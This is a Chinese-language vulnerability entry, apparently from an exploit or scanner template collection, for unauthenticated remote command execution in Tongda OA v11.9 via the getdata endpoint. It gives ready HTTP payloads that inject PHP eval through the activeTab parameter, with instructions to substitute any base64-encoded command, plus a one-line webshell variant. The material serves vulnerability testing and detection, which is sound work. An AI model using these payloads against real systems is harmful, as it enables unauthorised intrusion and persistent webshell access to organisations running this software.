---
id: TONGDA-V119-GETDATA-RCE
title: 通达OA v11.9 getdata 接口任意命令执行
product: tongda-oa
vendor: 北京通达信科
version_affected: "V11.9"
severity: CRITICAL
tags: [rce, 无需认证, 国产, oa]
fingerprint: ["通达OA", "Office Anywhere", "getdata", "Carouselimage"]
---

## 漏洞描述

通达OA v11.9 getdata 接口存在任意命令执行漏洞，攻击者通过构造恶意 activeTab 参数可注入 PHP eval 执行任意命令。

## 影响版本

- V11.9

## 前置条件

- 无需认证
- 目标为通达OA V11.9，`getdata` 接口可访问

## 利用步骤

1. 构造恶意 `activeTab` 参数，注入 PHP eval 代码
2. 将待执行命令进行 base64 编码后嵌入 payload
3. 发送 GET 请求至 `/general/appbuilder/web/portal/gateway/getdata`，从响应确认命令执行

## Payload

```http
GET /general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&id=19&module=Carouselimage HTTP/1.1
Host: target
```

base64 内容 `ZWNobyB2dWxuX3Rlc3Q7` 解码为 `echo vuln_test;`，替换为目标命令的 base64 编码。

一句话木马版本：

```http
GET /general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval($_POST[c]))%3B/*&id=19&module=Carouselimage HTTP/1.1
Host: target
```

## 验证方法

响应中包含命令执行结果即确认漏洞存在。
